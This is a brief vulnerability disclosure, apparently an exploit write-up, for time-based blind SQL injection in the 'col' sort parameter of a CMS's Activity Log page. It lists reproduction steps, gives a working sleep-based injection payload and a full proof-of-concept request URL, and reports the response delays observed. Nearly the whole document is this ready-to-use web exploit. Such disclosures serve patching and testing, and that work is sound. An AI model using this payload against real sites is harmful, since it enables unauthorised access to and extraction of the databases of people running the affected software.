Steps to Reproduce:
1. At first login your panel
2. then go to "Activity Log" menu
3. then select any type option
4. their "col" parameter is vulnerable. Let's try to inject Blind SQL Injection using this query "and (select * from(select(sleep(1)))a)" in "col=" parameter.

POC:
http://127.0.0.1/fuel/logs/items?type=debug&search_term=&limit=50&view_type=list&offset=0&order=desc&col=entry_date
and (select * from(select(sleep(1)))a)&fuel_inline=0

Output:
By issuing sleep(0) response will be delayed to 0 seconds.
By issuing sleep(1) response will be delayed to 1 seconds.
By issuing sleep(5) response will be delayed to 5 seconds.
By issuing sleep(10) response will be delayed to 10 seconds
